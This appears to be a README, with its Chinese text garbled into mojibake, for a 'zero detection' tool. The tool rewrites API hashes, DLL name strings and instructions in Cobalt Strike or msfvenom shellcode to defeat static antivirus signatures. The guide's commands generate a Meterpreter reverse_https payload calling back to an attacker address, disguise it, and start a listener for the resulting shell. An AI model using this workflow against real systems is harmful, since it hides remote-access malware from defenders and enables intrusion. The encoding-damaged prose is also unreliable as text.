# é›¶æ£€æµ‹ API å“ˆå¸ŒéšæœºåŒ–å·¥å…· - ä½¿ç”¨æŒ‡å—

> **æœ€åæ›´æ–°**: 2026-01-30 | **ç‰ˆæœ¬**: 2.2

## ğŸ¯ åŠŸèƒ½ç‰¹æ€§

### å››å±‚ç‰¹å¾ä¿®æ”¹æŠ€æœ¯

1. **API å“ˆå¸ŒéšæœºåŒ–** (æ ¸å¿ƒåŠŸèƒ½)
   - éšæœºåŒ– ROR å€¼
   - é‡æ–°è®¡ç®—æ‰€æœ‰ API å“ˆå¸Œ
   - ä¿®æ”¹å·²çŸ¥å“ˆå¸Œå€¼ç‰¹å¾

2. **DLL åç§°å¤§å†™åŒ–**
   - ç ´åæ ˆå­—ç¬¦ä¸²ç‰¹å¾
   - ä¾‹å¦‚: `"wininet"` â†’ `"wIninet"`
   - ä¸å½±å“åŠŸèƒ½ (LoadLibraryA ä¸åŒºåˆ†å¤§å°å†™)
   - æ”¯æŒ 12 ç§å¸¸è§ DLL

3. **CLD æŒ‡ä»¤ç§»åŠ¨**
   - ç ´åé¦–æŒ‡ä»¤ç‰¹å¾
   - **åªæ›¿æ¢ä¸æ’å…¥** (ä¿æŒ shellcode å¤§å°ä¸å˜)
   - éœ€è¦æ‰¾åˆ°å¯æ›¿æ¢çš„ NOP ä½ç½®
   - å¦‚æœæ‰¾ä¸åˆ° NOP,ä¼šå®‰å…¨è·³è¿‡

4. **ToUpper å‡½æ•°å˜å½¢** â­ 
   - å°† `SUB al, 0x20` æ”¹ä¸º `XOR al, 0x20`
   - ä¿®æ”¹æŒ‡ä»¤ç‰¹å¾
   - åŠŸèƒ½å®Œå…¨ç­‰ä»·

âš ï¸ **é‡è¦è¯´æ˜**: è¿™äº›æŠ€æœ¯ç”¨äºä¿®æ”¹å·²çŸ¥çš„é™æ€ç‰¹å¾ï¼Œ**ä¸ä¿è¯èƒ½ç»•è¿‡ä»»ä½•ç‰¹å®šçš„å®‰å…¨äº§å“**ã€‚å®é™…æ•ˆæœå–å†³äºå¤šç§å› ç´ ã€‚

## ğŸ“¦ å®‰è£…

### ä¾èµ–

```bash
# å®‰è£… pefile (ç”¨äºåŠ¨æ€ DLL è§£æ)
pip install pefile

# ç”Ÿæˆ API ç¼“å­˜ (é¦–æ¬¡ä½¿ç”¨)
python dll_parser.py -v

# éªŒè¯
python apihash_lists.py
```

### å¯é€‰ä¾èµ–

```bash
# ç”¨äºåæ±‡ç¼–å’Œå¯¹æ¯” shellcode
pip install capstone
```

## ğŸš€ ä½¿ç”¨æ–¹æ³•

### æ¨èç”¨æ³•

```bash
# å®Œæ•´ç‰¹å¾ä¿®æ”¹ (ä¸å« CLD ç§»åŠ¨,æœ€å®‰å…¨)
python apihash_zero_detection.py -a x64 -i beacon.bin --uppercase-dlls --transform-toupper

# å®Œæ•´ç‰¹å¾ä¿®æ”¹ (CLD ç§»åŠ¨å¯èƒ½è·³è¿‡)
python apihash_zero_detection.py -a x64 -i beacon.bin --zero-detection -v
```

### è¾“å‡ºç¤ºä¾‹

```
[INFO] è¯»å– shellcode: beacon.bin
[INFO]   å¤§å°: 4096 å­—èŠ‚
[INFO] âœ“ å·²åˆ›å»ºå¤‡ä»½: beacon.bin.bak

[INFO] æ­¥éª¤ 1: API å“ˆå¸ŒéšæœºåŒ–
[INFO] ==================================================
[INFO] æ£€æµ‹åˆ° ROR å€¼: 0xd
[INFO] æ–° ROR å€¼: 0x7c
[INFO] âœ“ API å“ˆå¸Œæ›¿æ¢: å‘ç° 23 ä¸ª API

[INFO] æ­¥éª¤ 2: DLL åç§°å¤§å†™åŒ–
[INFO] ==================================================
[INFO] âœ“ DLL åç§°å¤§å†™åŒ–: ä¿®æ”¹äº† 2 å¤„

[INFO] æ­¥éª¤ 3: CLD æŒ‡ä»¤ç§»åŠ¨
[INFO] ==================================================
[INFO]   æ£€æµ‹åˆ°ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²æ“ä½œåœ¨ä½ç½® 35
[INFO] âœ— æ— æ³•å®‰å…¨ç§»åŠ¨ CLD!
[INFO]   è·³è¿‡ CLD ç§»åŠ¨æ­¥éª¤

[INFO] æ­¥éª¤ 3.5: ToUpper å‡½æ•°å˜å½¢
[INFO] ==================================================
[INFO] âœ“ ToUpper å‡½æ•°å˜å½¢: ä¿®æ”¹äº† 1 å¤„

[INFO] æ­¥éª¤ 4: å®Œæ•´æ€§éªŒè¯
[INFO] ==================================================
[INFO] éªŒè¯ç»“æœ:
[INFO] --------------------------------------------------
[INFO] å¤§å°: 4096 â†’ 4096 å­—èŠ‚ âœ“ å¤§å°ç›¸åŒ
[INFO] ä¿®æ”¹: 95 å­—èŠ‚ (2.32%) âœ“ æ­£å¸¸
[INFO] ROR æŒ‡ä»¤: âœ“ å­˜åœ¨ (x64)
[INFO] ToUpper: âœ“ å·²å˜å½¢ (XOR: 1)

[INFO] æ€»ä½“è¯„ä¼°:
[INFO]   âœ“âœ“âœ“ å®Œç¾! Shellcode å®Œæ•´æ€§è‰¯å¥½

[INFO] âœ“ å¤„ç†å®Œæˆ!
[INFO] è¾“å‡ºæ–‡ä»¶: beacon_0x7c.bin
```

### é«˜çº§é€‰é¡¹

```bash
# ä»… API å“ˆå¸Œ
python apihash_zero_detection.py -a x64 -i beacon.bin

# ä»… DLL å¤§å†™åŒ–
python apihash_zero_detection.py -a x64 -i beacon.bin --uppercase-dlls

# ä»… ToUpper å˜å½¢
python apihash_zero_detection.py -a x64 -i beacon.bin --transform-toupper

# æ‰‹åŠ¨æŒ‡å®š ROR å€¼
python apihash_zero_detection.py -a x64 -i beacon.bin --ror-value 0x1f

# è¯¦ç»†è¾“å‡º
python apihash_zero_detection.py -a x64 -i beacon.bin --zero-detection -v
```

## âš ï¸ é‡è¦æ³¨æ„äº‹é¡¹

### CLD ç§»åŠ¨çš„é™åˆ¶

CLD ç§»åŠ¨ç°åœ¨ä½¿ç”¨**æ›¿æ¢**è€Œé**æ’å…¥**ç­–ç•¥:

- âœ… ä¸ä¼šæ”¹å˜ shellcode å¤§å°
- âœ… ä¸ä¼šç ´åç›¸å¯¹è·³è½¬
- âš ï¸ éœ€è¦æ‰¾åˆ°å¯æ›¿æ¢çš„ NOP ä½ç½®
- âš ï¸ å¦‚æœæ‰¾ä¸åˆ° NOP,ä¼šå®‰å…¨è·³è¿‡

**å¦‚æœ CLD ç§»åŠ¨å¤±è´¥**:
```bash
# ä½¿ç”¨å…¶ä»–æŠ€æœ¯,ä»ç„¶æœ‰æ•ˆ
python apihash_zero_detection.py -a x64 -i beacon.bin --uppercase-dlls --transform-toupper
```

### å¤§å°éªŒè¯

**ä¿®æ”¹åçš„ shellcode å¤§å°å¿…é¡»ä¸åŸå§‹ç›¸åŒ!**

å¦‚æœçœ‹åˆ°:
```
âœ— å¤§å°æ”¹å˜! (+1 å­—èŠ‚)
```

è¯´æ˜æœ‰é—®é¢˜,è¯·æ£€æŸ¥è¾“å‡º!

### ä»…æ”¯æŒ raw æ ¼å¼

```bash
# âœ“ æ­£ç¡®
msfvenom -p windows/x64/... --format raw -o beacon.bin

# âœ— é”™è¯¯ (ä½¿ç”¨äº†ç¼–ç å™¨)
msfvenom -p windows/x64/... -e x64/xor -o beacon.bin
```

## ğŸ“‹ å®Œæ•´å·¥ä½œæµç¨‹

### 1. ç”ŸæˆåŸå§‹ shellcode

```bash
# Msfvenom
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.1.100 LPORT=443 \
  --format raw \
  -o beacon.bin
```

### 2. åº”ç”¨ç‰¹å¾ä¿®æ”¹

```bash
# æ¨è: ä¸å« CLD ç§»åŠ¨
python apihash_zero_detection.py -a x64 -i beacon.bin \
  --uppercase-dlls --transform-toupper -v

# æˆ–: å®Œæ•´ç‰¹å¾ä¿®æ”¹
python apihash_zero_detection.py -a x64 -i beacon.bin --zero-detection -v
```

### 3. éªŒè¯ shellcode

```bash
# åœ¨éš”ç¦»ç¯å¢ƒæµ‹è¯•åŠŸèƒ½
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
run
```

## ğŸ” æ•…éšœæ’é™¤

### é—®é¢˜ 1: "æœªæ‰¾åˆ°ä»»ä½• API å“ˆå¸Œ"

**åŸå› **: Shellcode å¯èƒ½ä¸ä½¿ç”¨ ROR å“ˆå¸Œ

**è§£å†³**:
- ç¡®è®¤ shellcode æ¥è‡ª Cobalt Strike æˆ– Msfvenom
- ä½¿ç”¨ `--format raw` ç”Ÿæˆ shellcode
- ä¸è¦ä½¿ç”¨ç¼–ç å™¨

### é—®é¢˜ 2: "æ— æ³•å®‰å…¨ç§»åŠ¨ CLD"

**åŸå› **: æ²¡æœ‰å¯æ›¿æ¢çš„ NOP ä½ç½®

**è§£å†³**:
```bash
# è·³è¿‡ CLD ç§»åŠ¨,ä½¿ç”¨å…¶ä»–æŠ€æœ¯
python apihash_zero_detection.py -a x64 -i beacon.bin \
  --uppercase-dlls --transform-toupper
```

### é—®é¢˜ 3: ä¿®æ”¹å shellcode ä¸å·¥ä½œ

**å¯èƒ½åŸå› **:
1. API å“ˆå¸Œæ›¿æ¢ä¸å®Œæ•´
2. DLL åç§°ä¿®æ”¹æœ‰é—®é¢˜

**è§£å†³**:
1. æ¢å¤å¤‡ä»½æ–‡ä»¶ (`beacon.bin.bak`)
2. ä½¿ç”¨è¯¦ç»†æ¨¡å¼åˆ†æ: `-v`

### é—®é¢˜ 4: "API åˆ—è¡¨ä¸ºç©º"

**åŸå› **: pefile æœªå®‰è£…æˆ–ç¼“å­˜æœªç”Ÿæˆ

**è§£å†³**:
```bash
pip install pefile
python dll_parser.py -v
```

## ğŸ“ é¡¹ç›®æ–‡ä»¶

```
â”œâ”€â”€ apihash_zero_detection.py   # ä¸»è„šæœ¬ â­
â”œâ”€â”€ apihash_lists.py            # API åˆ—è¡¨æ¨¡å—
â”œâ”€â”€ dll_parser.py               # DLL è§£ææ¨¡å—
â”œâ”€â”€ dll_cache.json              # API ç¼“å­˜ (è‡ªåŠ¨ç”Ÿæˆ)
â””â”€â”€ apihashreplace.py           # åŸå§‹è„šæœ¬ (å…¼å®¹)
```

---

*æœ€åæ›´æ–°: 2026-01-30*
